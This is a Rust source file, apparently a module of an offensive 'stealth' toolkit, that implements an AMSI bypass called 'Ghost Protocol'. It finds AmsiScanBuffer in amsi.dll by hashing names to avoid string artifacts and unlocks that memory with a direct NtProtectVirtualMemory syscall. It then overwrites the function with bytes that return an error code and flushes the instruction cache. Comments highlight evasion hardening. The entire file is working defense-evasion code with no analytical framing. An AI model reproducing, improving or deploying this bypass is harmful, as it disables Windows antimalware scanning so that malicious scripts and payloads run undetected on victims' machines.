#![allow(non_snake_case)]
#![allow(dead_code)]

//! # Ghost Protocol - AMSI Bypass (Native Rust Port)
//! [HARDENED v3]
//! - Stability: NtFlushInstructionCache added (Critical Loophole Fixed)
//! - OpSec: No String Artifacts (Error Codes only)
//! - Safety: 6-byte patch (Safe Instruction Boundary)

use crate::stealth::windows::api_resolver::{self, djb2};
use crate::stealth::windows::syscalls::{self, Syscall};
use std::ffi::c_void;
use std::ptr;

// Log only in debug builds
#[cfg(debug_assertions)]
use log::{info, warn};

// ============================================================================
// CONSTANTS
// ============================================================================

const PAGE_EXECUTE_READWRITE: u32 = 0x40;

// ============================================================================
// PUBLIC API
// ============================================================================

#[cfg(target_arch = "x86_64")]
pub fn apply_ghost_protocol() {
    #[cfg(debug_assertions)]
    info!("GP Init");

    if let Err(_c) = unsafe { execute_bypass() } {
        #[cfg(debug_assertions)]
        warn!("GP Fail: {}", _c);
    } else {
        #[cfg(debug_assertions)]
        info!("GP OK");
    }
}

#[cfg(not(target_arch = "x86_64"))]
pub fn apply_ghost_protocol() {}

// ============================================================================
// CORE LOGIC
// ============================================================================

#[cfg(target_arch = "x86_64")]
unsafe fn execute_bypass() -> Result<(), u32> {
    // Error Codes:
    // 1: Module Not Found
    // 2: Function Not Found
    // 3: Syscall Not Found
    // 4: Protect Failed
    // 5: Flush Failed

    // 0. Resolve NtFlushInstructionCache (Crucial for Stability)
    const HASH_NT_FLUSH: u32 = djb2(b"NtFlushInstructionCache");
    // We get this from ntdll (usually loaded)
    const HASH_NTDLL: u32 = djb2(b"ntdll.dll");
    
    let ntdll = api_resolver::get_module_by_hash(HASH_NTDLL).ok_or(1u32)?;
    let flush_func = api_resolver::get_export_by_hash(ntdll, HASH_NT_FLUSH).ok_or(2u32)?;
    let nt_flush: unsafe extern "system" fn(isize, *const c_void, usize) -> i32 = 
        std::mem::transmute(flush_func);

    // 1. Target amsi.dll
    const HASH_AMSI: u32 = djb2(b"amsi.dll");
    let amsi_base = api_resolver::get_module_by_hash(HASH_AMSI).ok_or(1u32)?;

    // 2. Target AmsiScanBuffer
    const HASH_AMSI_SCAN_BUFFER: u32 = djb2(b"AmsiScanBuffer");
    let target_func = api_resolver::get_export_by_hash(amsi_base, HASH_AMSI_SCAN_BUFFER).ok_or(2u32)?;

    // 3. Patch (6 bytes - Safer boundary than 8)
    // MOV EAX, 0x80070057; RET
    // B8 57 00 07 80 C3
    let patch_bytes: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];

    // 4. Unlock Memory
    let sc_protect = Syscall::resolve(syscalls::HASH_NT_PROTECT_VIRTUAL_MEMORY).ok_or(3u32)?;
    
    let mut base_addr = target_func as *mut c_void;
    let mut region_size = patch_bytes.len();
    let mut old_protect: u32 = 0;

    let status = syscalls::syscall(&sc_protect, &[
        -1 as isize as usize,
        &mut base_addr as *mut _ as usize,
        &mut region_size as *mut _ as usize,
        PAGE_EXECUTE_READWRITE as usize,
        &mut old_protect as *mut _ as usize
    ]);

    if status != 0 { return Err(4u32); }

    // 5. WRITE
    ptr::copy_nonoverlapping(patch_bytes.as_ptr(), target_func as *mut u8, patch_bytes.len());

    // 6. FLUSH I-CACHE (CRITICAL FIX)
    // Ensure CPU sees the new instructions
    nt_flush(-1, target_func as *const c_void, patch_bytes.len());

    // 7. Relock
    let mut region_size2 = patch_bytes.len();
    let mut temp: u32 = 0;
    
    syscalls::syscall(&sc_protect, &[
        -1 as isize as usize,
        &mut base_addr as *mut _ as usize,
        &mut region_size2 as *mut _ as usize,
        old_protect as usize,
        &mut temp as *mut _ as usize
    ]);

    Ok(())
}
